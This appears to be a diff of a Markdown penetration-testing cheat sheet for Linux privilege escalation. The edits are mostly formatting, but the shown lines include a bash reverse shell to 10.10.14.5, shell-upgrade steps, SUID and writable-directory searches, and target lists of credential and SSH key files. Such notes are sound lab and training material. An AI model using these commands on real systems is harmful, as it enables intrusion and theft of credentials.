@@ -22,7 +22,7 @@ su root2
 hostname
 ```
 
-## Check OS distribution and version
+## Linux OS distribution and version
 ```bash
 cat /etc/issue
 cat /etc/os-release
@@ -119,9 +119,9 @@ yum list installed
 
 ## Find all writable directories
 ```bash
+#find / -perm -222 -type d 2>/dev/null
+#find / -perm -o w -type d 2>/dev/null
 find / -writable -type d 2>/dev/null
-find / -perm -222 -type d 2>/dev/null
-find / -perm -o w -type d 2>/dev/null
 ```
 
 ## Find all SUID files
@@ -380,8 +380,7 @@ bash -c 'bash -i >& /dev/tcp/10.10.14.5/5678 0>&1'
 
 ## Upgrade shell to fully interactive TTY
 ```bash
-python3 -c 'import pty; pty.spawn("/bin/bash")'
-export TERM=xterm
+python3 -c 'import pty; pty.spawn("/bin/bash")'; export TERM=xterm
 # Press Ctrl-Z
 stty raw -echo; fg
 # Press Enter twice
@@ -424,21 +423,21 @@ Always create backup shells immediately after initial access:
 ### Common Privilege Escalation Vectors
 
 **High Priority:**
-- Sudo misconfigurations (NOPASSWD, wildcards, etc.)
-- SUID/SGID binaries (check GTFOBins)
-- Writable /etc/passwd or /etc/shadow
-- Docker group membership
-- Writable cron jobs or scripts
+- [ ] Sudo misconfigurations (NOPASSWD, wildcards, etc.)
+- [ ] SUID/SGID binaries (check GTFOBins)
+- [ ] Writable /etc/passwd or /etc/shadow
+- [ ] Docker group membership
+- [ ] Writable cron jobs or scripts
 
 **Medium Priority:**
-- PATH hijacking opportunities
-- LD_PRELOAD abuse
-- Capabilities on binaries
-- Writable service files
-- Database running as root
+- [ ] PATH hijacking opportunities
+- [ ] LD_PRELOAD abuse
+- [ ] Capabilities on binaries
+- [ ] Writable service files
+- [ ] Database running as root
 
 **Low Priority (Last Resort):**
-- Kernel exploits (risk of system crash)
+- [ ] Kernel exploits (risk of system crash)
 
 ### GTFOBins Reference
 When you find SUID binaries or sudo permissions, always check:
@@ -447,17 +446,17 @@ When you find SUID binaries or sudo permissions, always check:
 - https://gtfobins.github.io/#+capabilities
 
 ### Sensitive Files Checklist
-- /etc/passwd (writable?)
-- /etc/shadow (readable?)
-- /etc/group
-- /etc/sudoers
-- /etc/crontab
-- /var/log/auth.log
-- /var/log/secure
-- /home/*/.ssh/
-- /root/.ssh/
-- /var/www/html/config.php
-- Application configs in /opt and /usr/local
+- [ ] /etc/passwd (writable?)
+- [ ] /etc/shadow (readable?)
+- [ ] /etc/group
+- [ ] /etc/sudoers
+- [ ] /etc/crontab
+- [ ] /var/log/auth.log
+- [ ] /var/log/secure
+- [ ] /home/*/.ssh/
+- [ ] /root/.ssh/
+- [ ] /var/www/html/config.php
+- [ ] Application configs in /opt and /usr/local
 
 ### Resources
 - GTFOBins: https://gtfobins.github.io/
